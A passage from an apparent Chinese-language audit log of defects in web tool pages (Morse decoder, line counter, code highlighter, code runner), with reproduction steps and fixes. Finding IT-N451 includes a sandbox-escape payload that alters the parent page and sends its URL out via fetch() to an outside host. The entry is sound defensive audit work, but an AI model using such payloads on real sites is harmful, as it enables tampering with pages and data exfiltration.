- 方案：`walk` 传入父标签，`ol` 内的 `li` 用递增序号输出。
- 假工具：否

### IT-N439 `prettyHtml` 逐行 `trim`，代码块缩进经源码框往返后丢失（中，确认缺陷）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`prettyHtml()` 在 `></` 处断行后对每一行 `.trim()`（`:406`），`syncSource()`/`syncToSource()`/`applySource()` 都以它为准（`:413`、`:416`、`:424`），因此 `<pre>` 内的行首缩进也被删掉。
- 行号：`:402-409`（核心 `:406`）、`:410-427`
- 复现：编辑区代码块 `<pre>function f(){\n  if (a) {\n    return 1;\n  }\n}</pre>` → 依次点「↻ 从编辑区刷新」「✓ 应用到编辑区」→ 实际 `<pre>function f(){\nif (a) {\nreturn 1;\n}\n}</pre>`（`node` 复刻 `prettyHtml` 输出 `"<pre>function f(){\nif (a) {\nreturn 1;\n}\n}</pre>"`）；期望缩进原样保留。
- 影响：代码块内容只要经过一次源码区往返就被破坏；Python/YAML/Makefile 等缩进敏感代码直接失效，而页面主打"代码块 + 往返编辑"。
- 方案：格式化时跳过 `<pre>`/`<code>` 内部内容，或只插换行不做 `trim`。
- 假工具：否

### IT-N440 「增强版/自动推断时间单位/容错」完全未实现，无分隔电码一律解成 `?`（高，假工具）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：标题与说明承诺「增强版」「自动推断时间单位，容忍多余空格、缺失分隔与轻微噪声」「把连续符号按长度阈值判为点或划，再按间隔长度切分字符与单词」（`:153-159`、`:219`、`:223`）；但 `dec()` 只有三步：按 `/\s*\/\s*|\s{2,}/` 切词、按单空格切字符、精确查表，未命中一律 `?`（`:316-327`），根本没有阈值/时长推断。`dec()` 也不处理一行内连续符号。
- 行号：`:316-327`（承诺 `:153-159`、`:219`、`:223`）
- 复现：输入 `...---...`（无分隔的 SOS）→ 实际 `?`（`node` 复刻 `dec` 同结果）；期望 `SOS`。`..- --- ...` 之类"轻微噪声"也无任何容错。
- 影响：以"增强版"为卖点的核心能力不存在，用户按宣传输入不规范电码只会得到 `?`；本质是精确查表版，属名不符实的假工具。
- 方案：要么真正实现自适应切分（文本输入需先约定点划时长），要么把标题/文案改成"精确查表版"并删掉容错承诺。
- 假工具：是

### IT-N441 「DIT DAH」样式的编码结果无法解码回原文（中，编码往返不一致）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：`styleCode()` 在 word 样式把每个码元用单空格连接（`:296`），而 `dec()` 把单空格当作字符分隔（`:321`），于是 `DIT DAH` 序列被逐个符号当成一个字符。
- 行号：`:296`、`:320-323`（核心 `:322`）
- 复现：输入 `SOS`、样式选 `DIT DAH` → 输出 `DIT DIT DIT DAH DAH DAH DIT DIT DIT`；原样点「解码」→ 实际 `EEETTTEEE`（`node` 复刻一致）；期望 `SOS`。
- 影响：三种样式里唯一带可读单词的样式产出不可逆结果，编码→解码闭环失效。
- 方案：word 样式用双空格/`/` 分隔字符，或在 `dec` 里先按双空格切字符、单空格切码元。
- 假工具：否

### IT-N442 `&`、`+`、`=` 与 prosign 共用同一码，解码被覆盖成 `<AS>`/`<AR>`/`<BT>`（中，确认缺陷）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：`REVERSE` 先由 `MORSE` 填充，随后 `PROSIGNS` 覆盖同名码（`:288-289`）；三组冲突：`&`/`<AS>`=`.-...`、`+`/`<AR>`=`.-.-.`、`=`/`<BT>`=`-...-`。
- 行号：`:280-281`、`:283-285`、`:288-289`
- 复现：编码 `&` → `.-...` → 再解码实际 `<AS>`；`+` → `<AR>`；`=` → `<BT>`（`node` 复刻）。期望还原原标点。
- 影响：任意包含 `& + =` 的电码解码后都变成 prosign，报文内容被改写，且没有任何提示。
- 方案：prosign 与字符码分开存放，解码按上下文/优先级判定，或编码时避开冲突表示。
- 假工具：否

### IT-N443 编码不支持 Prosigns 记号，`<AR>` 被拆成 `A R`（中，承诺未实现）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：说明称「含字母、数字、标点符号、Prosigns（特殊信号）」（`:162`），码表也列出 `<AA>`…`<SN>`（`:283-285`）；但 `enc()` 逐个单字符查 `MORSE`（`:307-311`），`<`、`>` 不在表中被静默丢弃，prosign 标记永远不会被识别。
- 行号：`:162`、`:283-285`、`:307-311`
- 复现：输入 `<AR>` → 实际 `.- .-.`（A R）；期望 `.-.-.`。`<SK>` → 实际 `... -.-`（S K），期望 `...-.-`。
- 影响：prosign 只能解不能编，宣传的字符集不成立；用户以为发出了"消息结束"，实际发了两个字母。
- 方案：`enc()` 先用 `/<[A-Z]{2}>/` 整体匹配 `PROSIGNS`，再逐字符编码。
- 假工具：否

### IT-N444 「倒序」按 UTF-16 码元反转，emoji/辅助平面字符被拆成无效代理项（中，编码往返不一致）
- 页面：`tools/it/string-obfuscator.html`
- 问题：`result=text.split('').reverse().join('')`（`:290`）按码元反转，代理对被打散。
- 行号：`:290`
- 复现：输入 `😀a` → 实际 `a\uDE00\uD83D`（`node` 实测 JSON 为 `"a\ude00\ud83d"`，渲染为 `a` + 乱码/替换符）；期望 `a😀`（`Array.from` 反转）。
- 影响：含 emoji、生僻字（辅助平面）的文本倒序后产生孤立代理项，输出不可读且不可还原。
- 方案：改为 `Array.from(text).reverse().join('')`。
- 假工具：否

### IT-N445 字符串内的 `/*` 被当作块注释起点，后续整段代码被吞为注释（高，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：`isInStr()` 定义于 `:292-301` 但全文无任何调用（grep 仅定义 1 处），块注释检测直接用 `t.indexOf('/*')`（`:325`），不区分字符串/模板字符串/正则。页面 :123 却明确承诺「字符串或正则字面量中出现的 `//`、`/*` 不应被误判为注释」。
- 行号：`:292-301`（死代码）、`:321-327`（核心 `:325`）
- 复现：JS 输入 `var re = "/*";` 换行 `var a = 1;` 换行 `var b = 2;` → 实际 总行 3 / 代码 0 / 注释 3 / 空 0、代码占比 `0.0%`（`node` 复刻）；期望 代码 2、注释 0、占比 `66.7%`。
- 影响：正则、URL、模板字符串里出现 `/*` 的代码会被整段吞为注释，代码行数与占比严重失真；这是统计工具的核心输出。
- 方案：扫描时维护字符串/模板字符串/正则状态机，在字符串内跳过 `/*`、`//`。
- 假工具：否

### IT-N446 块注释结束行被重复计数，默认示例四卡片之和大于总行数（高，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：`if(inBlock)` 分支先 `comment++`（`:317`），结束块注释后在 `:328` 又按最终判定再计一次；结束行若还带代码，则注释与代码各记一次。
- 行号：`:317`、`:328`
- 复现：页面默认示例（`:148-157`）→ 实际 总行 10 / 代码 4 / 注释 6 / 空行 1（合计 11 > 总行 10，注释应为 5，`node` 复刻 `{total:10,code:4,comment:6,blank:1,sum:11}`）；再如 `/* start` / ` middle` / `*/ const a = 1;` → 注释 3、代码 1，合计 4 > 总行 3。
- 影响：打开页面第一眼的数据就自相矛盾（注释率、代码占比随之失真），用户无法判断该信哪张卡片。
- 方案：结束行只在统一收口处计一次（删掉 `if(inBlock)` 内的 `comment++`，改记状态）。
- 假工具：否

### IT-N447 行中块注释被判为整行注释，行尾 `/* */` 使代码行漏计（中，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：块注释起点只要 `indexOf('/*')>=0` 就置 `isComment`（`:325`），不检查其前面是否有代码；而行注释只在行首匹配（`:319`），两者口径不一致。
- 行号：`:319`、`:321-327`
- 复现：JS 输入 `var x = 1; /* note */` 换行 `var y = 2;` → 实际 代码 1 / 注释 1（第一行算注释）；期望 代码 2 / 注释 0（或单列"含注释的代码行"）。
- 影响：常见的行尾块注释让代码行被少计，统计口径与主流工具（cloc/tokei）不一致。
- 方案：命中 `/*` 时若其前有非空代码，计为代码行；只有整行都是注释时才计注释行。
- 假工具：否

### IT-N448 高亮按行独立 tokenize，跨行块注释/三引号字符串/HTML 注释无法识别（中，确认缺陷）
- 页面：`tools/it/code-highlighter.html`
- 问题：`renderHighlighted()` 先 `code.split('\n')`，再对每行单独调用 `tokenize(line, lang)`（`:1346-1352`）；而 tokenize 的 `/* */`（`:944-951`）、Python `"""`/`'''`（`:952-959`）、HTML `<!-- -->`（`:1102-1108`）都只在单行内找结束符，跨行必然失配。页面公式却承诺识别块注释与三引号字符串（`:312`）。
- 行号：`:1345-1361`（核心 `:1352`）、`:944-951`、`:952-959`、`:1102-1108`
- 复现：JS 输入三行 `/* a` / ` b` / `*/` → 实际第 1 行注释色、第 2 行 `b` 普通色、第 3 行 `*/` 运算符色；期望三行整体注释色。Python 多行 docstring、HTML 多行注释同症状；模板字符串跨行也会被拆成多色。
- 影响：文档注释、多行字符串是最常见输入，高亮结果错色并被"复制高亮 HTML"原样带出。
- 方案：整段 tokenize 后再按 token 内部换行拆行渲染，或携带跨行状态。
- 假工具：否

### IT-N449 「复制高亮 HTML」不带 `.hl-*` 样式，粘贴到页面外全无颜色（中，确认缺陷）
- 页面：`tools/it/code-highlighter.html`
- 问题：`copyHighlightedHTML()` 只拼容器与 `td` 的内联样式（`:1447-1451`），没有导出 `.hl-keyword/.hl-string/.hl-comment…` 的颜色规则（这些规则只存在于本页 `<style>` 的 `:166-196`），复制结果里的 `<span class="hl-…">` 在目标文档中无任何样式。
- 行号：`:1433-1455`（核心 `:1447-1451`）、`:166-196`
- 复现：输入 `const a = 1;` → 点「🎨 高亮渲染」→「📋 复制高亮 HTML」→ 把剪贴板内容存成 `.html` 打开 → 实际只有黑色等宽文本与行号，关键字/字符串/注释全无颜色；期望保留着色。
- 影响：该按钮的唯一用途就是带走带色片段，产物在页面外不可用（结构、行号、字体正常，仅颜色全部丢失）。
- 方案：复制时把 `.hl-*` 规则（含浅/深主题色）内联成 `<style>` 前缀，或为每个 span 写行内 `style="color:…"`。
- 假工具：否

### IT-N450 Emoji 数据集重复 3 个字符，计数虚高且检索出现重复卡片（中，确认缺陷）
- 页面：`tools/it/emoji-picker.html`
- 问题：`EMOJI` 数组（`:209`）里 `💡`（idea/bulb）、`✈️`（airplane/plane）、`💬`（speech/comment）各出现两次，`calcTool()` 不去重，标题直接用 `list.length`（`:212`）。
- 行号：`:209`、`:211-212`
- 复现：留空搜索 → 实际「共 195 个 emoji」，去重后 192（`node` 读页内数组：total 195 / unique 192）；搜索 `灯`、`飞机` 各返回两张同字符卡片；期望 192 且每字符一张。
- 影响：计数口径错误，检索结果重复，用户以为存在不同表情；与"内置约 180 个"（`:169`）也对不上。
- 方案：构建/加载时按字符去重（保留首个），或删除重复条目。
- 假工具：否

### IT-N451 `sandbox` 同时开 `allow-scripts` 与 `allow-same-origin`，隔离失效且可外发数据（高，安全缺陷）
- 页面：`tools/it/code-runner.html`
- 问题：iframe 声明 `sandbox="allow-scripts allow-modals allow-same-origin"`（`:494`）。按 HTML 规范，`allow-scripts` + `allow-same-origin` 会让框架保留父页同源身份、脚本可访问父文档，沙箱形同虚设（浏览器会给出"可逃逸沙箱"告警）；父子页也确实依赖同源才能 `contentDocument` + `doc.write`（`:717-761`）。页面却称「交给隔离 iframe 执行」（`:401`）、「防止访问主页面 DOM、Cookie 与同源数据」（`:405`），FAQ 称「不能访问网络/文件，沙箱隔离，仅纯计算」（`:604`）。
- 行号：`:494`（承诺 `:401`、`:405`、`:601`、`:604`、`:623-629`）
- 复现：JS 面板输入 `parent.document.body.dataset.pwned='1'; parent.localStorage.setItem('tb','x'); fetch('https://example.com/x?d='+encodeURIComponent(parent.location.href))` 后运行 → 实际父页 DOM 被改、localStorage 被写、跨域请求已出站（受 CORS 影响但请求已发出）；期望 `parent.document` 抛 `SecurityError`、无网络请求。
- 影响：任何被粘贴或分享的代码片段都能读写本站 localStorage 并外发，或改写工具页 UI；"浏览器沙箱隔离"的安全承诺不成立（当前能力等同"同页预览器"）。
- 方案：去掉 `allow-same-origin`，改用 `srcdoc`/Blob URL 注入且父页不再直接访问 `contentDocument`（控制台仍经 postMessage），并声明"非安全沙箱"直至改完。
- 假工具：否

### IT-N452 用户 JS 里的字面量 `</script>` 提前闭合内联脚本，整段代码失效（中，确认缺陷）
- 页面：`tools/it/code-runner.html`
- 问题：`doc.write(... '<script>' + js + '<\/script>' ...)`（`:759`）把用户 JS 原样嵌入内联脚本，出现字面量 `</script>` 即提前结束脚本块，后续内容被当作 HTML。
- 行号：`:759`
- 复现：JS 输入 `console.log("</script>")` 后点运行 → 实际生成 `<script>console.log("` 被截断，控制台报语法错误、剩余代码变成页面文本；期望正常打印 `</script>`。
- 影响：演示 `document.write('<script src=x></script>')` 这类 HTML 字符串是常见需求，一写整段失效，且报错指向用户代码、掩盖真实原因。
- 方案：拼接前把 `js` 中的 `</script` 替换为 `<\/script`（或用 `srcdoc` 并转义）。
- 假工具：否

### IT-N453 用户代码无超时/终止机制，`while(true)` 直接冻结整个标签页（中，承诺未实现）
- 页面：`tools/it/code-runner.html`
- 问题：`executeInIframe()` 把用户 JS 直接写进同线程 iframe（`:758-759`），没有任何超时或终止；页面深解示例写「输出 `1024`（受超时与内存限制）」（`:601`），标准表写「限制 CPU 时间与内存，防止无限循环耗尽资源」（`:629`）。
- 行号：`:717-761`（核心 `:758-759`）、`:601`、`:629`
- 复现：JS 输入 `while(true){}` 后运行 → 实际整个标签页（含本页 UI）无响应，只能强杀标签；期望超时后终止并提示。
- 影响：死循环/长任务让工具页永久卡死，用户未保存代码丢失；与页面两处"受超时限制"的说法矛盾。
- 方案：用 Worker + `terminate()` 计时，或在执行前提示"无限循环会冻结页面"并删除超时承诺。
- 假工具：否

### IT-N454 忙等测试在事件派发前就占满主线程，`stopFlag` 永远不会置位、无法中途停止（中，确认缺陷）
- 页面：`tools/it/benchmark-builder.html`
- 问题：`run()` 在 `setTimeout(…,30)` 回调里同步 `while(!stopFlag && performance.now()-start<duration)` 忙等（`:291-303`，循环在 `:295`）；`stopFlag` 只在 `stopRun()`（`:283`）里置位，而 `stopRun()` 只能由「负载类型」select 的 change（`:123`）或预设按钮回调（`:369`、`:421`）触发——主线程被 `while` 占用期间事件无法派发，`stopFlag` 恒为 false；`:293` 定义的 `guard` 也从未被调用。
- 行号：`:123`、`:283`、`:284-313`（核心 `:295`）、`:293`
- 复现：时长选 5 秒 → 点「▶ 开始测试」→ 运行中切换负载类型/点击任何按钮 → 实际页面完全无响应约 5 秒、测试跑满全程；期望能中途停止并保留已完成部分。
- 影响：「可停止」的交互是死代码，任何一次测试都会冻结 UI；页面 :156 只提示"可能短暂卡顿"，未说明无法停止。
- 方案：改用 Worker 计时与停止，或把忙等切成 `setTimeout` 分片让出主线程。
- 假工具：否

### IT-N455 「复制测试代码」只给出空循环，忽略所选负载与时长，无法复现页面结果（中，假功能）
- 页面：`tools/it/benchmark-builder.html`
- 问题：`copyCode()` 生成的是写死模板（`:315-318`）：注释里只有类型名，循环体只有 `// 在此放入被测代码` + `ops++`，时长固定 `1000`ms，完全不读取 `#type` 的负载逻辑与 `#ms` 的时长。
- 行号：`:315-318`
- 复现：选「数组操作」+「5 秒」→ 点「复制测试代码」→ 实际得到 `while(performance.now()-start<1000){ // 在此放入被测代码\n ops++; }`，只测空循环开销，与所选负载无关；期望复制包含 `push`/`sort` 的对应负载并写入 5000ms。
- 影响：这是该页唯一可带走的产物，拿到的代码测不出页面上的负载，对比结果无意义。
- 方案：按 `type` 生成对应 workload 片段，并把 `ms` 注入循环条件。
- 假工具：否

### 覆盖清单（V 批 IT 编辑器/安全/编码）
- `rich-text-editor`：IT-N437（高，安全）；IT-N438、IT-N439（中）。
- `morse-decode-advanced`：IT-N440（高，假工具）；IT-N441、IT-N442、IT-N443（中）。
- `string-obfuscator`：IT-N444（中）；无高优缺陷（全角/ROT13/Base64/`\x` 十六进制/HTML 实体主路径往返核对正确，十六进制对 emoji 按 UTF-8 字节输出无截断）。
- `code-line-counter`：IT-N445、IT-N446（高）；IT-N447（中）。
- `code-highlighter`：IT-N448、IT-N449（中）；无高优缺陷（token 渲染统一走 `esc()`，`<`/`>`/`&`/`"` 已转义，未发现注入）。
- `emoji-picker`：IT-N450（中）；无高优缺陷（字符/中文关键词/英文名过滤逻辑本身正确，复制路径无注入）。
- `code-runner`：IT-N451（高，安全）；IT-N452、IT-N453（中）。
- `benchmark-builder`：IT-N454、IT-N455（中）；无高优缺陷（五种负载的循环体与吞吐公式本身可算，评级阈值仅为经验值）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数实算（`calcTool` 行数统计、`enc/dec`、`prettyHtml`、emoji 数组去重、`split('')` 反转）并给出「输入 → 实际 / 期望」；**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N437 的事件属性执行、IT-N451 的沙箱逃逸依据 HTML 规范（`innerHTML` 插入的 `onerror` 会触发；`allow-scripts` + `allow-same-origin` 不提供来源隔离）判定，未做真机复现。

## W 批 · IT URL/签名/安全（2026-11-04）




### 覆盖清单（W 批 IT URL/签名/安全）
- `url-qr`：无剩余缺陷（IT-N456 真编码器、IT-N457 纠错+尺寸双控件均已销账，第183–184批）。
- `og-meta-tag-generator`：无剩余缺陷（IT-N458 空值跳过+缺失告警已销账，第189批；`escA` 先转 `&` 再转 `"`，输出走 `textarea.value`，属性上下文不可注入）。
- `http-response-headers`：无剩余缺陷（IT-N459 删除 4 个混入的请求头 + ETag/Last-Modified 去重已销账，第190批；`COMMANDS` 65→59、分类仍 14，`renderCommands` 全部字段走 `escapeHtml`，搜索/复制路径无注入）。
- `api-sign-generator`：无剩余缺陷（IT-N460 XSS、IT-N461 真 MD5、IT-N462 预设重算均已销账，第185–187批）。
- `rc4`：无剩余缺陷（IT-N463 显式格式解析已销账，第188批；`rc4()` 与 `RC4-drop` 主路径对照已知向量 `Key`/`Plaintext` → `bbf316e8d940af0ad3` 正确，KSA/PRGA 无死循环）。
- `js-minify`：无剩余高优/中优缺陷（IT-N464 已改为轻量词法扫描，保留字符串/正则/模板串与换行，第182批销账；结果渲染走 `escH`，无注入）。
- `url-params`：无剩余高优/中优缺陷（IT-N465/IT-N466/IT-N467 均已修复，第178–179批补独立锁与真机复核后销账）。
- `short-link-generator`：无剩余高优/中优缺陷（IT-N468 已改为 hash 映射，第180批销账；输出全部经 `escapeHtml`）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数（`renderQR`、`minify`、`rc4`、`parseParams`、`md5Hex`）并给出「输入 → 实际 / 期望」；MD5 对照用 `crypto.createHash('md5')`，QR 不可扫码依据"无数据位/格式信息/纠错码字"的算法结构判定；`esc()` 不转义双引号、`innerHTML` 属性注入按 HTML 序列化规则判定（文本节点只转义 `&<>`），未开真机浏览器复现 XSS。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## W 批 · IT 计算/文本（2026-11-04）

### 覆盖清单（W 批 IT 计算/文本）
- `matrix-determinant`：无高优/中优缺陷（`detRec` 与 BigInt Bareiss 精确值对照 100 组随机 2–5 阶全对；5×5 整数矩阵得 −4656 一致；Sarrus 正负号与 2×2/3×3 公式均正确）。
- `vector-magnitude`：模长/单位向量公式正确：`|(3,4)|=5`，三维方向角 `acos(vᵢ/|v|)` 正确。
- `keyword-extractor`：停用词表实测 183 中文 + 132 英文，标签/表格/图表输出均经 `ToolBox.escHtml`。
- 方法声明：逐页通读上述 8 页源码，在 `/tmp` 用 `node` 直接抽取/复刻页面原函数（页面真实 `md5()`、表达式白名单 + `new Function`、叉积夹角、`detRec` + BigInt Bareiss、页面真实 `PINYIN` 表 + `slugify()`、`tokenizeChinese`/`filterKeywords`/`deduplicateSubstrings` + 页面真实停用词表、`isPrime`/因式分解）逐一给出「输入 → 实际 / 期望」；MD5 用 `crypto.createHash('md5')` 与 `printf '中文' | md5` 双对照；`onclick` 截断用 `python3 html.parser` 验证属性拆分。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## X 批 · IT 速查/工具（2026-11-04）

> 只读审计 8 页：`tools/it/` 下 ruby-cheatsheet、pomodoro、convert-11、postgresql-cheatsheet、typescript-cheatsheet、typing-test、cpp-cheatsheet、git-commands。未开浏览器、未跑 `_build.py`/`run_gates.py`；验证脚本仅落 `/tmp`。

### 覆盖清单（X 批 IT 速查/工具）
- `git-commands`：低优备注：`git cherry-pick`（:370/:422）与 `git bisect`（:407/:424）各重复一条，使分类计数与表格总数虚增 2。
- `pomodoro`：无剩余高优/中优缺陷（IT-N480/N481 已改为时间戳计时与跳过不落账，第181批销账；模式切换、时长设置、图表/统计渲染主流程可跑）。
- `convert-11`：IT-N483（中）；其余主路径正确（`192.168.1.1 ↔ 3232235777 ↔ 11000000.00000000.00000001.00000001`，`4294967295 ↔ 255.255.255.255 ↔ 全 1` 均对齐）。
- `typescript-cheatsheet`：示例注解已全改 `//`、非空断言示例带 `<HTMLInputElement>` 泛型（IT-N485/N486，第177批）；无高优（泛型/工具类型/`keyof` 等示例经核对正确）。
- `typing-test`：IT-N482（中）；无高优（WPM/准确率公式正确，中文按字/分、英文按 5 字符/词，历史与图表取数正确）。
- `cpp-cheatsheet`：示例注解已全改 `//`（IT-N484 第176批 + IT-N486 第177批）；无其它高优（`constexpr` 阶乘、`std::optional`、模板示例经核对正确）。
- `ruby-cheatsheet`：示例注解已全改 `#`（IT-N486，第177批）；无高优（搜索/分类/复制/图表逻辑正常，块/Proc/Lambda 示例正确）。
- `postgresql-cheatsheet`：无高优/中优（`--` 在 SQL/psql 中是合法注释；`psql` 元命令、DML/DDL、JSONB、`pg_dump -Fc` 与 `pg_restore -j` 组合均与官方文档一致——`-j` 明确支持 custom 与 directory 两种格式）。
- 安全：本批 8 页未发现可利用的安全问题（唯一 HTML 拼接点是 `git-commands` 的静态 `COMMANDS` 与搜索文本匹配，不写入 `innerHTML`；`typing-test` 历史渲染的 localStorage 内容仅在同源自污染范围内，不计）。
- 方法声明：逐页通读 8 页源码；在 `/tmp` 用 `node` 抽取 `git-commands` 的 `COMMANDS` 并对 58 条内联 `onclick` 逐一 `new Function` 编译、用 `python3 html.parser` 验证属性换行保留；用 `node` 复刻 `convert-11` 的 `calc()`/`toBin32()` 逐输入实跑；用 `clang++ -std=c++20 -fsyntax-only` 编译重载示例；用 `ruby`/`ruby -c` 实跑 `--` 注解示例；用真实 `git update-ref` + `git switch` 复现远程分支错误。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## X 批 · IT 速查/编码 II（2026-11-04）

### 覆盖清单（X 批 IT 速查/编码 II）
- `json-path`：IT-N488（高，安全）、IT-N489（高，死循环）、IT-N490（高，安全）；无其它高优（预设、递归/通配符/`length()` 主路径正确）。
- `barcode-codabar`：IT-N491（高，编码表）、IT-N492（中）、IT-N493（中）；其余绘制/导出 PNG 主流程可跑。
- `charset-detector`：IT-N494（高，假工具）、IT-N495（高，安全）；无其它高优。
- `php-cheatsheet`：IT-N496（中）；PDO/Composer/trait/命名空间示例均存在，其余命令与语法经核对正确。
- `kubernetes-cheatsheet`：IT-N497（中）；32 条命令的 `kubectl get/apply/scale/rollout/logs/exec/cp` 与 YAML 示例（selector、port、pathType）经核对正确。
- `linux-cheatsheet`：IT-N498、IT-N499、IT-N500（中）；114 条命令主体正确，搜索/分类/复制/图表渲染无注入（数据为静态，渲染前统一 `escapeHtml`）。
- `vim-cheatsheet`：IT-N501（中）；模式/移动/替换/窗口/寄存器示例经核对正确。
- `nickname-generator`：IT-N502、IT-N503、IT-N504（中）；无高优（生成主流程可跑，输出经 `escapeHtml`）。
- 安全：本批 3 条——`json-path` 的 `eval()`（IT-N488）与高亮 `innerHTML`（IT-N490）、`charset-detector` 的 `innerHTML`（IT-N495），均为「用户输入未转义/未隔离」型 DOM 注入，属自触发（无持久化、无跨用户传播路径），但都是真实可控代码执行点，建议按高优修。`barcode-codabar` 的输入只进 `canvas` 与 `textContent`，无注入。
- 假工具：1 个（`charset-detector`，IT-N494）：名为「编码识别器」，实际只做 6 条固定串替换，文档宣称的 GBK 十六进制识别完全不存在。
- 方法声明：逐页通读 8 页源码（含 `_build.py` 注入的图表/表格脚本）；在 `/tmp` 用 `node` 复刻 `json-path` 的 `parseTokens` 与切片循环（带步数上限判定死循环）、`parseInt('5:2')` 验证步长失效；用 `node` 遍历 `CODABAR` 表统计元素数与宽元素数，并对照 Wikipedia Codabar 结构（基础 12 符 1 宽条 + 1 宽空、起止符 1 宽条 + 2 宽空）逐字符核验；用 `hexdump` 确认 `RULES` 第二条正则两个分支均为同一 U+FFFD 字符；逐条比对 `--` 注解在 bash / PHP / kubectl / Vim 的语义。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做 git 写操作**；未修改任何工具页、代码或构建产物，新增脚本仅落在 `/tmp`，仅在本审计日志追加本节。

## Y 批 · IT 转换/速查（2026-11-04）

- `ascii-tree-generator`：中 2 —— 文件/目录标记冲突会静默丢子树；公式框承诺的「缩进文本推断层级」未实现。
- `barcode-code39`：高 1、中 2 —— 编码表元素数与宽元素数均不符，产出非法 Code 39；Mod 43 校验位与不支持字符处理均与承诺不符。
- `barcode-msi`：中 3 —— 校验位控件缺失、非数字静默剥离、公式框与 `buildMSI` 实现不符。
- `camera-recorder`：中 2 —— 承诺「分辨率选择」无控件；录制中点「关闭摄像头」会触发自动下载。
- `csharp-cheatsheet`：中 1 —— 示例 6 处 `-- 注释` 在 C# 中非法，复制后编译报错。
- `docker-cheatsheet`：中 2 —— 3 处命令尾 `-- 注解` 破坏命令；`docker build` 语法字段写错。
- `emacs-cheatsheet`：中 2 —— 启动命令的 `-- 注解` 被当文件名；撤销条目把 `C-/` 标成「重做」。
- `email-qr`：高 1 —— 二维码为伪随机噪点，无任何 QR 编码/纠错，扫码无效（假工具）。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
|---|---|---|

**统计**
- 页数：8（`ascii-tree-generator`、`barcode-code39`、`barcode-msi`、`camera-recorder`、`csharp-cheatsheet`、`docker-cheatsheet`、`emacs-cheatsheet`、`email-qr`）。
- 问题：16 条——高 2（IT-N507、IT-N520）/ 中 14。
- 编号区间：IT-N505–IT-N520，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：1 个（`tools/it/email-qr.html`，IT-N520）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户输入均经 `escapeHtml` 或仅写入 `textarea.value`/`canvas`，未发现可控 DOM 注入点。
- 方法：逐页通读 HTML 与全部内联 JS；用 node 复刻 `ascii-tree-generator` 的 `build()` 验证子树丢失、统计 `barcode-code39` 表每字符元素数/宽元素数与生成模块数；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Y 批 · IT 速查/生成（2026-11-04）

**逐页结论（8 页，均通读 HTML 与全部内联 JS）**
- `tools/it/emoji-cheatsheet.html`：搜索、分类、柱状图均实时遍历 `EMOJIS` 生成，确属数据驱动；但数据表有 8 组重复 emoji，统计按条目重复计数。
- `tools/it/java-cheatsheet.html`：搜索、分类、图表均遍历 `COMMANDS` 生成，可用；4 处示例用了 Java 非法的 `--` 注释。
- `tools/it/kubernetes-yaml-generator.html`：Deployment + Service 模板缩进与嵌套合法；端口、名称、镜像未做合法性校验，非法输入原样拼入 YAML。
- `tools/it/location-qr.html`：**伪二维码**——不编码 geo 载荷，只画三个定位角、定时线与哈希噪点，扫码不可能得到坐标。
- `tools/it/lorem.html`：words/sentences/paragraphs 三种主流程可用；词数边界、预设/历史回调、中文占位承诺三处有缺陷。
- `tools/it/markdown-lint.html`：标题跳级/重复标题/列表缺空格/空链接 4 条规则真实现；承诺的行尾空格、代码块语言未实现，且行首强调符号会误报。
- `tools/it/nato-alphabet.html`：26 字母映射覆盖完整，正/反向均可跑；`X-ray` 反查失败、字母计数不准。
- `tools/it/nginx-cheatsheet.html`：搜索、分类、柱状图/明细表均遍历 `COMMANDS` 生成，可用；配置示例含非法 `--` 注释与永不成立的 `$https` 判断。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
| --- | --- | --- |

**统计**
- 页数：8（`emoji-cheatsheet`、`java-cheatsheet`、`kubernetes-yaml-generator`、`location-qr`、`lorem`、`markdown-lint`、`nato-alphabet`、`nginx-cheatsheet`）。
- 问题：15 条——高 1（IT-N521）/ 中 14（IT-N522–IT-N535）。
- 编号区间：IT-N521–IT-N535，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：1 个（`tools/it/location-qr.html`，IT-N521，伪二维码噪点）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户输入均经 `escapeHtml`/`escH` 或仅写入 `textarea.value`/`canvas`，未发现可控 DOM 注入点。
- 方法：逐页通读 HTML 与全部内联 JS；用 node 复刻 `markdown-lint` 的 `calcTool()`、`lorem` 的 words 分支与 `nato-alphabet` 的反查/计数，确认误报与边界；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Z 批 · IT 校验/速查（2026-11-04）

**逐页结论（8 页，均通读 HTML 与全部内联 JS）**
- `tools/it/password-strength.html`：熵、字符集、检查项与破解时间均实时计算；但三档破解时间标签与实际速率不符，且「强度等级」用 6 项清单评分，未按公式声明的熵阈值判读。
- `tools/it/python-cheatsheet.html`：搜索、分类、柱状图与明细表均遍历 `COMMANDS` 生成，可用；15 条示例用 Python 非法的 `--` 注释，复制即语法错误。
- `tools/it/redis-cheatsheet.html`：常用命令、数据结构、事务、Stream、Lua 条目覆盖完整；4 条示例的 `-- 注解` 会被 redis-cli 当作参数，复制执行报错。
